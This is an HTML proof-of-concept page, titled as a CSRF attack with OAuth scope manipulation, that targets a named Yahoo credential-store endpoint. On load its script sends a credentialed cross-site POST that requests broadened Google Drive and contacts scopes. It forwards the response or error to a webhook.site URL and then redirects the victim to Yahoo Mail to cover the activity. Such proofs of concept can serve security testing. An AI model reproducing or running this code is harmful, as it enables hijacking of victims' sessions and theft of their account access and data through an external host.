
        <html>
        <head>
            <title>CSRF Attack with Scope Manipulation</title>
        </head>
        <body>
            <p>Attempting CSRF attack with scope manipulation...</p>
            <script>
                window.onload = function() {
                    // Prepare the payload for the CSRF attack with manipulated scope
                    const payload = {
                        "guid": "me",
                        "serviceProviderId": "e0b61efe-086e-11e2-8a42-002481ee7a3a_d272b02a187f48993f0978aa409da8b5",
                        "code": "TEST_CODE",
                        "state": "TEST_STATE",
                        "cid": "TEST_CID",
                        "scope": "email https://www.googleapis.com/auth/userinfo.email openid https://www.googleapis.com/auth/drive https://www.googleapis.com/auth/contacts"
                    };
                    
                    // Send a POST request to the authorize-callback endpoint
                    fetch('https://api-gcp.credstore.yahoo.com/v1/users/@me/service-providers/e0b61efe-086e-11e2-8a42-002481ee7a3a_d272b02a187f48993f0978aa409da8b5/authorize-callback', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload),
                        credentials: 'include'
                    })
                    .then(response => response.json())
                    .then(data => {
                        // Send the response to Webhook
                        const dataStr = `CSRF Response: ${JSON.stringify(data)}`;
                        fetch('https://webhook.site/8f016836-304a-44d8-aee7-ed7bae810a25?data=' + encodeURIComponent(dataStr))
                            .then(res => console.log('Data sent to Webhook'))
                            .catch(err => console.error('Error sending to Webhook:', err));
                    })
                    .catch(error => {
                        // Send the error to Webhook
                        const errorStr = `CSRF Error: ${error.message}`;
                        fetch('https://webhook.site/8f016836-304a-44d8-aee7-ed7bae810a25?data=' + encodeURIComponent(errorStr))
                            .then(res => console.log('Data sent to Webhook'))
                            .catch(err => console.error('Error sending to Webhook:', err));
                    });

                    // Final redirect to mail.yahoo.com after 5 seconds
                    setTimeout(function() {
                        window.location.href = "https://mail.yahoo.com";
                    }, 5000);
                };
            </script>
        </body>
        </html>
        